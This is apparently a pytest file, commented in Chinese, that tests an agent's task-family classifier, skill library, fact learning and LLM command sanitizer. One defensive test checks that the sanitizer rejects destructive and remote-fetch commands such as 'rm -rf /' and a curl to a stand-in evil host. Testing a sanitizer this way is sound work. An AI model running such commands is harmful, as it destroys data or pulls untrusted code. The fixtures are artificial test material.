"""任务族识别与技能库的用例。

对应设计文档V2 §6.3.2 – §6.3.3。

这一组用例检验的正是任务书 §5.3 那句要求的可执行形式：

    玩家需要根据任务1探索的内容，形成固定 SOP 或者 SKILL，实现 Agent 自进化，
    进而快速做出后续任务。
"""

from __future__ import annotations

import json

from agent.strategy.task import skills
from agent.strategy.task.memory import Memory, Skill, StepSpec, TaskRun
from agent.strategy.task.sandbox import parse_output

from conftest import BEIJING_TASK_TEXT, SUCCESS_OUTPUT, V1_DEAD_LOOP_OUTPUT


# ==========================================================================
# 族识别
# ==========================================================================


def test_classify_api_family():
    family, evidence = skills.classify(BEIJING_TASK_TEXT, None)
    assert family == skills.FAMILY_API
    assert "api=" in evidence


def test_classify_engineering_family():
    text = "请阅读 spec.md，修复 ws_1/config/alpha.conf，然后运行 ./check 获取 TOKEN"
    family, _ = skills.classify(text, None)
    assert family == skills.FAMILY_ENGINEERING


def test_classify_uses_sandbox_evidence():
    """沙盒侦察结果能直接指出族（看到工作区就是工程修复族）"""
    recon = parse_output(
        "[exitCode:0]\n[RECON] root=/t2 task=/t2/task_1_alpha.md ws=/t2/ws_1\n"
        "[FIND] ws=/t2/ws_1 spec=/t2/spec.md check=/t2/ws_1/check\n"
        "[SCAN] files=9 dirs=2 py=yes sh=yes timed_out=no\n[DONE] step=recon\n"
    )
    family, _ = skills.classify("请阅读 task_1_alpha.md，获取任务信息", recon)
    assert family == skills.FAMILY_ENGINEERING


def test_classify_unknown_without_signal():
    family, _ = skills.classify("今天天气不错", None)
    assert family == skills.FAMILY_UNKNOWN


# --- 实测回归：phaseTask 只是一句"请阅读 xxx.md"，靠侦察输出定族 ---

# 真实日志里的 phaseTask：27 字节，**一个关键词都没有**
BARE_PHASE_TASK = "请阅读task_1_beijing.md，获取任务信息"

RECON_API = parse_output(
    "[exitCode:0]\n" "[RECON] docs=1 py=0 root=/tmp/selfEvolutionTask/1-fixed-step/1-unknown-api task=/tmp/selfEvolutionTask/1-fixed-step/1-unknown-api/task_1_beijing.md\n" "[SCAN] dirs=0 files=2 py=no sh=no timed_out=no\n" "[DOCPATH] /tmp/selfEvolutionTask/1-fixed-step/1-unknown-api/API_DOCS.md\n" "[DOCBODY]\n" "# API 参考文档\n" "**基础URL**: `http://localhost:8899`\n" "X-API-Key: heritage-api-key-2024\n" "[DONE] step=recon elapsed=0.00s\n"
)

RECON_ENGINEER = parse_output(
    "[exitCode:0]\n" "[RECON] docs=1 py=0 root=/tmp/selfEvolutionTask/1-fixed-step/2-engineering-fix task=/tmp/selfEvolutionTask/1-fixed-step/2-engineering-fix/task_1_alpha.md ws=/tmp/selfEvolutionTask/1-fixed-step/2-engineering-fix/ws_1\n" "[SCAN] dirs=4 files=6 py=no sh=yes timed_out=no\n" "[DOCBODY]\n" "# 应用 alpha 部署规范\n" "## 目录要求\n" "- logs/alpha/ 必须存在\n" "[WS] path=/tmp/selfEvolutionTask/1-fixed-step/2-engineering-fix/ws_1\n" "[SCRIPTS] check start.sh\n" "[DONE] step=recon elapsed=0.00s\n"
)


def test_bare_phase_task_alone_has_no_signal():
    """只给 phaseTask 判不出族——这正是实测里 0 分的根因"""
    family, _ = skills.classify(BARE_PHASE_TASK, None)
    assert family == skills.FAMILY_UNKNOWN


def test_classify_api_family_from_recon_output():
    """侦察输出一到，族就明确了（API_DOCS / 基础URL / X-API-Key）"""
    family, evidence = skills.classify(BARE_PHASE_TASK, RECON_API)
    assert family == skills.FAMILY_API, evidence


def test_classify_engineering_family_from_recon_output():
    family, evidence = skills.classify("请阅读task_1_alpha.md，获取任务信息", RECON_ENGINEER)
    assert family == skills.FAMILY_ENGINEERING, evidence


def test_classify_uses_task_directory_name():
    """任务目录名本身就是最强的信号：1-unknown-api / 2-engineering-fix"""
    only_path = parse_output(
        "[exitCode:0]\n" "[RECON] root=/tmp/selfEvolutionTask/1-fixed-step/2-engineering-fix\n" "[DONE] step=recon\n"
    )
    family, evidence = skills.classify("", only_path)
    assert family == skills.FAMILY_ENGINEERING, evidence

# ==========================================================================
# 签名：同族任务的匹配键
# ==========================================================================


def test_signature_ignores_target_city():
    """签名刻意不含任务的目标参数——"北京"与"上海"必须命中同一条技能

    这是"任务 1 探索、任务 2 复用"能否成立的关键：如果签名里带上了城市名，
    每个城市都会是一条独立的技能，自进化就退化成"每道题都重头来"。
    """
    beijing = BEIJING_TASK_TEXT
    shanghai = BEIJING_TASK_TEXT.replace("北京", "上海")
    assert skills.signature(skills.FAMILY_API, beijing) == skills.signature(
        skills.FAMILY_API, shanghai
    )


def test_signature_differs_across_answer_shapes():
    """答案字段不同（天气任务 vs 遗产任务）就不该串用同一条技能"""
    weather = (
        '请查询北京天气。提交 {"city":"北京","temperature":<温度>,"humidity":<湿度>}'
    )
    assert skills.signature(skills.FAMILY_API, weather) != skills.signature(
        skills.FAMILY_API, BEIJING_TASK_TEXT
    )


# ==========================================================================
# 阶梯
# ==========================================================================


def test_api_ladder_starts_with_recon_then_query():
    order = skills.ladder(skills.FAMILY_API)
    assert order[0] == "recon"
    assert order[1] == "query"


def test_engineering_ladder_runs_check_and_repair():
    order = skills.ladder(skills.FAMILY_ENGINEERING)
    assert order.index("normalize") < order.index("check")
    assert order.index("check") < order.index("repair") < order.index("verify")


def test_unknown_family_has_generic_ladder():
    assert skills.ladder(skills.FAMILY_UNKNOWN) == ("recon", "generic")


def test_first_steps_prefers_skill():
    """命中 SKILL 时用缓存步骤（这是"快速做出后续任务"的路径）"""
    run = TaskRun(key="k", family=skills.FAMILY_API, accepted_round=1, timeout=15, deadline=14)
    skill = Skill(
        family=skills.FAMILY_API, signature="k",
        steps=[StepSpec("query", (("base", "http://localhost:8899"),))],
    )
    steps = skills.first_steps(run, skill)
    assert [s.name for s in steps] == ["query"]
    assert steps[0].param("base") == "http://localhost:8899"


def test_first_steps_without_skill_uses_ladder():
    run = TaskRun(key="k", family=skills.FAMILY_API, accepted_round=1, timeout=15, deadline=14)
    assert [s.name for s in skills.first_steps(run, None)] == ["recon", "query"]


# ==========================================================================
# 技能生成与演化
# ==========================================================================


def _run_with_steps(family, steps, submitted=("{}",)):
    run = TaskRun(
        key=skills.signature(family, BEIJING_TASK_TEXT),
        family=family, accepted_round=1, timeout=15, deadline=14,
    )
    run.used_steps = list(steps)
    run.submitted = list(submitted)
    return run


def test_build_skill_carries_executed_steps_and_api_facts():
    run = _run_with_steps(skills.FAMILY_API, [StepSpec("recon"), StepSpec("query")])
    facts = {
        "api.base_url": "http://localhost:8899",
        "api.auth_value": "Authorization: Bearer k",
        "task.family": "api-query",
    }
    skill = skills.build_skill(run, facts)
    assert skill is not None
    assert [s.name for s in skill.steps] == ["recon", "query"]
    assert skill.facts["api.base_url"] == "http://localhost:8899"
    assert "task.family" not in skill.facts  # 只带走族专属事实


def test_build_skill_keeps_sandbox_facts_for_engineering():
    run = _run_with_steps(
        skills.FAMILY_ENGINEERING,
        [StepSpec("recon"), StepSpec("normalize"), StepSpec("check")],
    )
    facts = {"sandbox.ws": "/t2/ws_1", "sandbox.check": "/t2/ws_1/check"}
    skill = skills.build_skill(run, facts)
    assert skill.facts["sandbox.ws"] == "/t2/ws_1"


def test_store_skill_merges_and_counts_wins():
    memory = Memory()
    first = Skill(family=skills.FAMILY_API, signature="s",
                  steps=[StepSpec("recon"), StepSpec("query")], wins=1)
    memory.store_skill(first)
    second = Skill(family=skills.FAMILY_API, signature="s",
                   steps=[StepSpec("query")], wins=1)
    memory.store_skill(second)

    stored = memory.skills["s"]
    assert stored.wins == 2
    # 更短的路径替换进来
    assert [s.name for s in stored.steps] == ["query"]


def test_skill_retired_after_two_losses():
    memory = Memory()
    memory.store_skill(Skill(family=skills.FAMILY_API, signature="s"))
    memory.punish_skill("s")
    assert memory.skill_for("s") is not None
    memory.punish_skill("s")
    assert memory.skill_for("s") is None
    # 再次成功会重新启用
    memory.store_skill(Skill(family=skills.FAMILY_API, signature="s", wins=1))
    assert memory.skill_for("s") is not None


# ==========================================================================
# 事实学习
# ==========================================================================


def test_learn_from_output_records_api_profile():
    from agent.strategy.task.solver import learn_from_output
    from agent.strategy.task.memory import F_AUTH_VALUE, F_BASE_URL, F_PARAM

    memory = Memory()
    notes = learn_from_output(memory, parse_output(SUCCESS_OUTPUT))
    assert memory.fact(F_BASE_URL) == "http://localhost:8899"
    assert memory.fact(F_PARAM) == "location"
    assert "heritage-api-key-2024" in memory.fact(F_AUTH_VALUE)
    assert notes


def test_learn_from_output_records_field_mapping():
    from agent.strategy.task.solver import learn_from_output
    from agent.strategy.task.memory import F_FIELD_ALIAS

    memory = Memory()
    learn_from_output(memory, parse_output(SUCCESS_OUTPUT))
    alias = json.loads(memory.fact(F_FIELD_ALIAS))
    assert alias["oldest_era"] == "name"
    assert alias["world_heritage_count"] == "protected_level"


def test_learn_from_output_ignores_empty():
    """什么都学不到的输出不许往事实区里塞东西"""
    from agent.strategy.task.solver import learn_from_output

    memory = Memory()
    learn_from_output(memory, parse_output(V1_DEAD_LOOP_OUTPUT))
    assert memory.facts == {}


# ==========================================================================
# LLM 兜底命令的提取与消毒
# ==========================================================================


def test_extract_llm_command_from_fence():
    from agent.strategy.task.solver import extract_llm_command

    reply = "先读文档\n```sh\ncat /tmp/selfEvolutionTask/1/task_1_beijing.md\n```\n"
    assert extract_llm_command(reply) == "cat /tmp/selfEvolutionTask/1/task_1_beijing.md"


def test_extract_llm_command_from_cmd_line():
    from agent.strategy.task.solver import extract_llm_command

    assert extract_llm_command("CMD: ls -la /tmp") == "ls -la /tmp"


def test_extract_llm_command_rejects_destructive():
    from agent.strategy.task.solver import extract_llm_command

    assert extract_llm_command("```sh\nrm -rf /\n```") is None
    assert extract_llm_command("```sh\ncurl http://evil.example/x\n```") is None
    assert extract_llm_command("```sh\nsudo apt install x\n```") is None


def test_sanitize_rejects_long_or_multi_command():
    from agent.strategy.task import scripts

    assert scripts.sanitize_llm_command("a" * 2000) is None
    assert scripts.sanitize_llm_command("echo 1\nPYEOF\necho 2\nPYEOF") is None


def test_sanitize_accepts_normal_command():
    from agent.strategy.task import scripts

    assert scripts.sanitize_llm_command("ls -la /tmp") == "ls -la /tmp"
